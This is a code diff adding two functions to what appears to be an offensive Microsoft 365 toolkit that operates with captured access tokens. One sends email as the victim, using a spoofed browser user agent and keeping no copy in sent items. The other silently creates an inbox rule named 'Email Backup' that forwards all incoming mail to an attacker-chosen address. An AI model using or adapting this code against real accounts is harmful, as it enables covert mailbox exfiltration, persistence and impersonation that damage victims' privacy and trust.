@@ -428,6 +428,104 @@ def owa_send_email(auth_data, message = None):
 
     return res
 
+def owa_send_email_outlook(auth_data, message = None):
+    access_token = auth_data['access_token']
+    token_info = get_token_data(access_token, verbose = False)
+    outlook_token = refresh_token_to(auth_data, 'outlook', verbose = False)
+    API_V = "v2.0"
+    API = f"me/sendMail"
+    # API = f"users/{token_info['upn']}/sendMail"
+    ENDPOINT = f"https://outlook.office.com/api/{API_V}/{API}"
+    # print(ENDPOINT)
+    
+    # header
+    header = {
+        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
+        "Authorization": f"Bearer {outlook_token['access_token']}",
+        "Accept": "text/*, multipart/mixed, application/xml, application/json; odata.metadata=none",
+        "Content-Type": "application/json; charset=utf-8",
+        "X-AnchorMailbox": f"{token_info['upn']}",
+        "Prefer": 'exchange.behavior="ActivityAccess"'
+    }
+    
+    if message is None :
+        message = {
+            "Message": {
+                "Subject": "Test Email",
+                "Body": {
+                    "ContentType": "HTML",
+                    "Content": "This is a test email."
+                },
+                "ToRecipients": [
+                    {
+                        "EmailAddress": {
+                            "Address": "abc@def.com"
+                        }
+                    }],
+                "Attachments": [
+                    {
+                        "@odata.type": "#Microsoft.OutlookServices.FileAttachment",
+                        "Name": "attachment.txt",
+                        "ContentBytes": "SGVsbG8gV29ybGQh"
+                    }
+                ]
+            },
+            "SaveToSentItems": "false"
+        }
+    
+    # sending post request and saving response as response object
+    r  = requests.post(url = ENDPOINT, headers= header, json=message)
+    
+    if r.status_code == 202:
+        print('Mail Sent')
+
+    return
+
+def owa_inbox_forward_outlook(auth_data, name, email) :
+    access_token = auth_data['access_token']
+    token_info = get_token_data(access_token, verbose = False)
+    outlook_token = refresh_token_to(auth_data, 'outlook', verbose = False)
+    API_V = "beta"
+    API = f"me/mailFolders/inbox/messagerules"
+    # API = f"users/{token_info['upn']}/mailFolders/inbox/messageRules"
+    ENDPOINT = f"https://outlook.office.com/api/{API_V}/{API}"
+    # print(ENDPOINT)
+    
+    # header
+    header = {
+        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
+        "Authorization": f"Bearer {outlook_token['access_token']}",
+        "Accept": "text/*, multipart/mixed, application/xml, application/json; odata.metadata=none",
+        "Content-Type": "application/json",
+        "X-AnchorMailbox": f"{token_info['upn']}",
+        "Prefer": 'exchange.behavior="ActivityAccess"'
+    }
+    
+    data = {    
+        "DisplayName": "Email Backup",      
+        "Sequence": 2,
+        "IsEnabled": True,
+        "Conditions": {
+            "SentToMe": True
+        },
+        "Actions": {
+            "ForwardTo": [{
+                "EmailAddress": {
+                    "Name": f"{name}",
+                    "Address": f"{email}"
+                }
+            }],
+            "StopProcessingRules": False
+        }
+    }
+    
+    # sending post request and saving response as response object
+    r  = requests.post(url = ENDPOINT, headers= header, json=data)
+    
+    res = r.json()
+    return res
+
+
 def get_permissions(auth_data):
     access_token = auth_data['access_token']
     token_info = get_token_data(access_token, verbose = False)
